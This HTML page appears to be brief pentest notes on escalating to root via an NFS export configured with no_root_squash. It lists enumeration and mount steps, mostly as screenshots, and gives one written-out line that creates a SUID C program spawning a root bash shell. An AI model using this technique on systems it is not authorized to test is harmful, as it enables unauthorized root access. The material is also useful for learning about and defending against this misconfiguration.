<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>NFS Root Squashing</title>
</head><body>We can look for the ACL of exportable path<br/>
to NFS Clients with <b>cat /etc/export:<br/>
</b>The <b>no_root_squash mean that the folder is sharable and mounted.<br/>
</b><b><br/>
<span style="font-size: 20pt">How the exploit work:<br/>
</span><span style="font-size: 20pt">with no_root_squash, we can use root from remote!</span><br/>
</b><img src="cat exports.png" /><br/>
<br/>
<br/>
From the <span style="color: #ff0000">attacker side, </span>we can check form mountable dir with <b>showmount:<br/>
</b><img src="showmount.png" /><br/>
<br/>
<br/>
Now we can mount our folder:<br/>
<img src="mount.png" /><br/>
<br/>
<br/>
Now, we are going to create a malicious <b>c file:<br/>
</b><b>echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' &gt; /tmp/1/x.c</b>&nbsp; <br/>
<img src="malicious compile.png" /><br/>
<br/>
<br/>
Add the SUID to the executable:<b><br/>
</b><img src="chmod permission.png" /><br/>
<br/>
<br/>
<br/>
Now, if we try to execute from the <span style="color: #0000ff">other machine</span><span style="color: #00007f">:<br/>
</span><img src="nfs exploit.png" /></body></html>